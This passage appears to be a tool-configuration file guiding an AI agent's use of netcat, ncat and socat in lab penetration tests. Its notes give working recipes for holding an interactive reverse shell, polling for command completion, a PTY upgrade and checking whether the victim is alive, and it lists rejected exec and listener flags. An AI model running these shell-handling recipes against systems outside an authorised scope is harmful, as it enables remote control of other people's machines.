  - "`-p` IS SOURCE PORT here (when -l is rejected). On netcat-traditional and on ssh, -p has different meanings. Inside this nc tool, -l / -L are REJECTED so the only legitimate use of -p is SOURCE PORT (rarely needed). Don't confuse with sshpass -p (PASSWORD) or scp -P (port). The cli_in_container parser is binary-scoped."
  - "STDIN HANDLING. Many usage patterns expect stdin (banner grab via /dev/null, UDP send via packed bytes, file send). cli_in_container's stdin support is required for these. If stdin isn't piped, nc may hang waiting for input — set -w to bound the wait, or stage the data in /session/output/payload.bin and rely on cli_in_container's stdin pipe."
  - "BANNER GRAB BEST PRACTICE. ncat with `--send-only --recv-only -w 3 host port` is cleaner than `nc -w 3 host port < /dev/null` because cli_in_container has NO SHELL — there's no `< /dev/null` redirect available. The ncat flags do the half-close in-binary."
  - "SOCAT ADDR SYNTAX IS DIFFERENT. socat takes `socat [OPTS] ADDR1 ADDR2` where each ADDR is `TYPE:host:port[,opts]` (e.g., TCP:10.10.10.5:80). The first POSITIONAL is one of these address tokens, NOT a bare hostname — target_extraction's regex-based positional walk MAY NOT cleanly extract the host from a socat ADDR. See open questions; deprioritize socat scope-validation for now."
  - "NETCAT-TRADITIONAL VS NETCAT-OPENBSD. Debian / Kali ship BOTH. The default `nc` symlink points to netcat-openbsd; the legacy binary lives at `nc.traditional`. Their flag sets DIFFER: e.g., -e (exec) is netcat-traditional only (and rejected here for safety). usage_patterns target the openbsd flavor unless explicitly using nc.traditional."
  - "UDP RELIABILITY. UDP is connectionless; nc -uz reports OPEN regardless of remote port state because there's no RST. Use nc -u for SENDING (where you control the payload and don't need a response confirmation), but for SCANNING UDP ports use nmap -sU (which sends protocol-specific probes and waits for ICMP unreachable replies)."
  - "NUMBER FOR PORT vs IP. The first positional after all flags is the host (IP / DNS name); the second is the port (integer / range). target_extraction extracts the host (group 1). The port is NOT extracted as a target — that's a port number, not a network target. This matches the registry's host-vs-port distinction."
  - "DON'T FORGET -n FOR FAST-FAIL. If the host is an IP, pass -n to skip DNS resolution. Saves a second on every call and avoids spurious 'Could not resolve hostname' errors when /etc/resolv.conf isn't reachable."
  - "HELD-LISTENER PATTERN (interactive reverse shell). Pipe a tail-f'd command file into ncat, capture output to another file, both under /session/output/listener-<port>/. Recipe: `binary: bash, command: -c 'tail -f /session/output/listener-<port>/cmd | ncat -lvnp <port> > /session/output/listener-<port>/out'`. The pipe form is critical — `<` redirect form does NOT work. Each separate tool-runner spawn appends one command to .../cmd via `echo 'whoami' >> .../cmd` and reads output by Read'ing .../out. The listener stays live for the full max_runtime_seconds (default 24h via cli_in_container). Verified empirically 2026-05-08."
  - "MARKER_$$ PATTERN for command-completion stability. Held shells emit output asynchronously — agent doesn't know when a command has finished. Convention: agent appends a unique marker to every command and polls until it appears. Recipe: `echo 'whoami; echo MARKER_$RANDOM_$$' >> .../cmd`. Then Read .../out repeatedly until MARKER_<id> shows up — that's the completion signal. Without this, agent reads partial output and may treat in-progress data as final. Document the marker value used so subsequent reads can grep for it."
  - "POSITION-TRACKED DELTA READ. The held-shell out_log grows unbounded. Reading the whole file every poll is O(N²) tokens for a long session. Track byte position per session (in agent state) and read only new bytes: `tail -c +<N>` reads from byte N onward, where N is the previous file size + 1. Or `sed -n '<L>,$p'` from line L. Either keeps token cost linear instead of quadratic. Critical for sessions with >50 commands."
  - "PTY UPGRADE for held reverse shells. Many programs (sudo, vim, su, passwd, htop, gdb, less) detect non-TTY stdin and refuse to run, exit immediately, or hang. Fix once after shell is held: append `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'` to the cmd_log. Verified empirically: subsequent `tty` returns /dev/pts/0 and `sys.stdin.isatty()` returns True. Run upgrade ONCE per held shell. Without PTY upgrade, sudo will silently swallow the next command (verified failure mode 2026-05-08)."
  - "TERMINATION via timeout NN, NOT via exit\\n. Sending `exit\\n` to cmd_log terminates the REMOTE bash but leaves the listener container running because the tail -f process keeps running. The listener won't release the port until the container itself exits. Two clean termination options: (1) wrap the held-listener invocation with `timeout NN bash -c '...'` so the container dies at NN seconds (preserves files on disk via SIGKILL — they're already written); (2) rely on cli_in_container's max_runtime_seconds cap. Don't rely on `exit\\n` for cleanup."
  - "MULTI-SESSION FILENAME CONVENTION. With multiple concurrent listeners, agent uses port-based naming: /session/output/listener-<port>/cmd and /session/output/listener-<port>/out. Port is unique per listener (the OS forbids two binds to the same port), so collisions are structurally impossible. Track active listeners by Read'ing /session/output/listener-* — each directory is one session."
  - "BINARY-OUTPUT HANDLING. If a held shell runs `cat /bin/<binary>` or similar, raw bytes hit out_log and corrupt the LLM's UTF-8 view (file size grows past actual byte count due to invalid-byte escaping). Avoid: agent commands like `cat <binary> | od -An -tx1` (od IS in the image) or `python3 -c 'import sys; print(sys.stdin.buffer.read().hex())' < <binary>` (python3 IS in the image). Don't `cat` binaries directly into the held-shell pipeline. Note: xxd is NOT in the image."
  - "LIVENESS DETECTION when victim disappears. If the remote shell process dies (victim host reboots, connection drops), agent appends to cmd_log but nothing happens — out_log stops growing silently, no error surface. Heuristic: after sending a command, expect the marker within ~10s (over fast network) or ~30s (over VPN like tun0). If no marker appears AND out_log size hasn't changed, the shell is dead. Restart the listener container and wait for a fresh callback."
  - "GET LHOST / LIST INTERFACES (replaces netcat MCP get_interfaces). Use `ip -j addr` for parseable JSON. nc image has python3 but NOT jq, so parse via python: `ip -j addr | python3 -c 'import json,sys; [print(i[\"ifname\"], next((a[\"local\"] for a in i.get(\"addr_info\",[]) if a[\"family\"]==\"inet\"), \"\")) for i in json.load(sys.stdin)]'`. Alternatively `ip addr` for human-readable output. The legacy netcat MCP get_interfaces returned `[{name, ip}, ...]`; the equivalent via cli_in_container is `binary: bash, command: -c 'ip -j addr'` and the agent parses (verified — 8 interfaces enumerated cleanly including tun0). tun0 is the typical VPN interface for HTB / lab engagements; that's the LHOST you'll bind listeners to (although ncat -lvnp binds 0.0.0.0 by default, so all interfaces accept inbound)."

failure_signatures:
  # Layer-diverse signals (SKILL #11) — at least 6 distinct verifiable
  # layers:
  #   1. DNS                  (resolution failure before TCP)
  #   2. TCP                  (connect refused / timed out / no route)
  #   3. Permission           (raw socket / privileged port)
  #   4. Argument / argparse  (unknown option, missing value)
  #   5. Listener-rejection   (-l / -k / -e attempted despite reject_flags)
  #   6. Source-port conflict (-p port already in use)
  #
  # Verified against:
  #   - netcat-openbsd 1.226 on Kali rolling (2026-04)
  #   - ncat 7.94 on Kali rolling
  #   - socat 1.8.x on Kali rolling

  # ── 1. DNS layer ──
  - signal: "Name or service not known"
    remediation: "DNS lookup failed. nc / ncat couldn't resolve the host. Check the spelling, verify /etc/hosts inside the container has the mapping (HTB targets often need a manual entry), or use the IP directly. Pass -n to skip DNS entirely if the host is an IP."
  - signal: "Could not resolve hostname"
    remediation: "Same DNS-resolution failure as above; phrasing variant. Same fix. ncat sometimes uses this phrasing where nc uses 'Name or service not known'."
  - signal: "Temporary failure in name resolution"
    remediation: "DNS server unreachable / timing out. Check network egress; on tun0 / VPN the DNS may be on the VPN side and require routing. Use the IP directly to bypass DNS."

  # ── 2. TCP layer ──
  - signal: "Connection refused"
    remediation: "TCP RST on the target port. Service is not listening, OR firewall returns RST instead of dropping. Verify with `nmap -p PORT HOST` (nmap shows 'closed' for RST, 'filtered' for drop). nc -z reports this on stderr."
  - signal: "Connection timed out"
    remediation: "TCP connect timeout — packet dropped (firewall) or host unreachable. Increase -w if the network is just slow; most often this means the port is firewalled. Verify with nmap -p PORT (will report 'filtered'). NB: without -w, the kernel timeout is 75+ s — exceeds idle_timeout_seconds."
  - signal: "No route to host"
    remediation: "Local routing table has no path to the target IP. On HTB / VPN, this usually means tun0 is down or the engagement scope IP doesn't match the actual VPN range. Check `ip route` and the VPN connection. (iproute2 is installed in this image — `ip addr` works for diagnostics.)"
  - signal: "Network is unreachable"
    remediation: "Local interface for the destination's network is down. Often the same root cause as 'No route to host'."
  - signal: "open"
    remediation: "INFORMATIONAL (not a failure). nc -z -v reports 'open' on stderr when a port accepts a connection. Treat as success; check exit code (0 = open)."

  # ── 3. Permission layer ──
  - signal: "Permission denied"
    remediation: "Privileged operation refused. Common causes: (a) binding to a low source port (-p <1024) without CAP_NET_BIND_SERVICE; (b) raw-socket operations. cli_in_container is non-privileged by default — pick a source port >1024, or skip -p entirely."
  - signal: "Operation not permitted"
    remediation: "Same root cause as 'Permission denied' — kernel refused a privileged operation. Don't pass low source ports unless cli_in_container is run privileged (it isn't, by default)."

  # ── 4. Argument / argparse layer ──
  - signal: "usage: nc"
    remediation: "nc / ncat printed usage banner — argparse fail. Common: missing host or port positional, unknown flag (typo), -w without an integer value. Run `nc -h` to see the canonical flag list."
  - signal: "usage: ncat"
    remediation: "ncat printed usage. Same root cause as nc usage. ncat's flag set is much larger; check `ncat -h` and verify long-form options spelled correctly (--send-only, NOT --send_only)."
  - signal: "unknown option"
    remediation: "argparse rejected a flag. Check the spelling. NB: nc -e (exec) is netcat-traditional only; on netcat-openbsd it's an unknown option. Even on netcat-traditional, -e is in reject_flags — use a different approach."
  - signal: "invalid argument"
    remediation: "A flag value is malformed. -w 3.5 fails (must be integer). -p 99999 fails (port range 1-65535). -X 99 fails (proxy type must be 4 / 5 / connect)."
  - signal: "missing argument"
    remediation: "A value-taking flag was passed without its value. -w (no number), -i (no interval), -p (no port). Check usage banner; supply the missing value."
  - signal: "socat"
    remediation: "socat-prefixed errors come from socat. Common: 'socat[N] E address parameter required', 'socat[N] E address ... unknown', 'socat[N] E ... resolution: Name or service not known'. Run `socat -hh` for the canonical address-type list."

  # ── 5. Listener / reject_flags layer ──
  - signal: "Listen mode requires"
    remediation: "An attempted listener invocation got past reject_flags somehow (this should NOT happen — reject_flags should reject -l / -k / -L / --listen at parse time). If you see this signal in live runs, file a bug — the parser missed a listener flag. Use the `netcat` (kind:mcp) tool for ALL listener operations."
  - signal: "rejected"
    remediation: "reject_flags fired (cli_in_container parser) — the call attempted a stateful flag (-l, -k, -L, --listen, --keep-open, -e, -c, --exec, --sh-exec). Use the `netcat` (kind:mcp) tool for listeners; pick a different approach for exec-on-connect (use scp / ssh for legitimate command execution)."

  # ── 6. Source-port / address-in-use layer ──
  - signal: "Address already in use"
    remediation: "-p SOURCE_PORT chose a port that another local socket holds. Pick a different source port, or omit -p entirely (kernel auto-assigns a high port)."
  - signal: "Cannot assign requested address"
    remediation: "-s SOURCE_IP specified an IP not bound to any local interface. Run `ip addr` to see local IPs; pick one that exists, or omit -s entirely."

help_commands:
  - command: "nc -h"
    purpose: "nc usage banner. Prints to stderr and exits non-zero on Debian's netcat-openbsd. Lists short flags only — for ncat's long flags, use `ncat -h`."
  - command: "ncat -h"
    purpose: "ncat full flag list — both short and long forms. Much larger than nc's help. Confirm option spelling here (--send-only, --proxy-type, etc.)."
  - command: "ncat --version"
    purpose: "Print Nmap ncat version (e.g., 'Ncat: Version 7.94 ( https://nmap.org/ncat )'). Useful for confirming the binary's version."
  - command: "socat -h"
    purpose: "socat option list (global flags only, NOT address types)."
  - command: "socat -hh"
    purpose: "socat FULL help including address types (TCP, UDP, OPENSSL, STDIO, FILE, EXEC, SYSTEM, ...). Long output — pipe to /session/output/socat-help.txt for inspection."
  - command: "socat -V"
    purpose: "socat version banner."
  - command: "nc.traditional -h"
    purpose: "netcat-traditional help. Smaller flag set than nc; some flags differ from netcat-openbsd. Rarely needed."
